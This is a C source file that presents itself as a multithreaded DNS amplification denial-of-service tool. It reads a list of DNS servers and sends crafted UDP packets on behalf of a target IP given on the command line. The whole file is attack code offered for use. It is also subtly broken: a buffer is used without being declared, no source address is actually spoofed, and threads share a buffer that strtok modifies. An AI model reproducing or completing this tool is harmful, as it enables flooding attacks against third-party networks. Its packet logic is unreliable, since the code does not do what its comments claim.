#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <pthread.h>

typedef struct{
    char *target_ip;
    char *dns_ip;
} dns_amplification_args;

void *dns_amplification_attack(void *args){
	dns_amplification_args *dns_args = (dns_amplification_args *) args;
	
	// Set up sockets
	int sock;
	struct sockaddr_in dest_addr;
	
	// Set up variables
	char buf[1024];
	int bytes_sent;
	
	// Craft packet
	char packet[1024];
	memset(packet, 0, 1024);
	packet[2] = 1;
	packet[3] = 0;
	packet[4] = 0;
	packet[5] = 1;
	packet[12] = 0;
	packet[13] = 0;
	packet[14] = 0x0c;
	packet[15] = 0;
	packet[16] = 0;
	packet[17] = 0;
	packet[18] = 0;
	packet[19] = 0;
	
	// Add target IP
	int ip_pos = 20;
	char *token;
	token = strtok(dns_args->target_ip, ".");
	while (token != NULL){
		int ip_byte = atoi(token);
		packet[ip_pos] = ip_byte;
		token = strtok (NULL, ".");
		ip_pos += 1;
	}
	
	// Create socket
	if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1){
		printf("error creating socket\n");
		return NULL;
	}
	
	// Set up destination address
	memset((char *) &dest_addr, 0, sizeof(dest_addr));
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(53);
	inet_aton(dns_args->dns_ip, &dest_addr.sin_addr);
	
	// Send packet
	if((bytes_sent = sendto(sock, &packet, 1024, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr))) == -1){
		printf("error sending packet\n");
		return NULL;
	}
	
	// Close socket
	close(sock);
	
	return NULL;
	
}

int main(int argc, char **argv){
	// Target IP
	char *target_ip = argv[1];
	
	// Open list of DNS servers
	FILE *f = fopen("dns_list.txt", "r");
	
	// Set up thread
	pthread_t attack_threads[1024];
	int thread_count = 0;
	
	// Loop through DNS servers
	while(fgets(buf, 1024, f) != NULL){
		
		// Set up thread args
		dns_amplification_args *dns_args = malloc(sizeof(dns_amplification_args));
		dns_args->target_ip = target_ip;
		dns_args->dns_ip = buf;
		
		// Create thread
		pthread_create(&attack_threads[thread_count], NULL, dns_amplification_attack, dns_args);
		thread_count++;
		
	}
	
	// Wait for threads to finish
	int i;
	for (i = 0; i < thread_count; i++){
		pthread_join(attack_threads[i], NULL);
	}
	
	// Close list of DNS servers
	fclose(f);
	
	return 0;
}
